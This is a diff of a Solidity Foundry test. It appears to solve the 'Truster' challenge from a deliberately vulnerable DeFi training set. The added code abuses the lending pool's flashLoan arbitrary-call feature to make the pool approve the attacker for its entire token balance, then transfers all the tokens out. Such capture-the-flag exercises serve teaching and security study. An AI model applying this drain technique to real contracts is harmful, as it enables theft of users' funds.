@@ -37,11 +37,30 @@ contract Truster is Test {
         console.log(unicode"🧨 Let's see if you can break it... 🧨");
     }
 
-    function testExploit() public {
+    function testExploitTruster() public {
         /**
          * EXPLOIT START *
          */
+ // Step 1: Create the malicious call data
+    // We'll approve the attacker to spend all of the pool's tokens
+    bytes memory data = abi.encodeWithSignature(
+        "approve(address,uint256)",
+        attacker,
+        TOKENS_IN_POOL
+    );
 
+
+vm.prank(attacker);
+    trusterLenderPool.flashLoan(
+        0,  // We don't need to borrow any tokens
+        attacker,
+        address(dvt),  // Target is the token contract
+        data
+    );
+
+    // Step 3: Now that we have approval, transfer all tokens from the pool to the attacker
+    vm.prank(attacker);
+    dvt.transferFrom(address(trusterLenderPool), attacker, TOKENS_IN_POOL);
         /**
          * EXPLOIT END *
          */
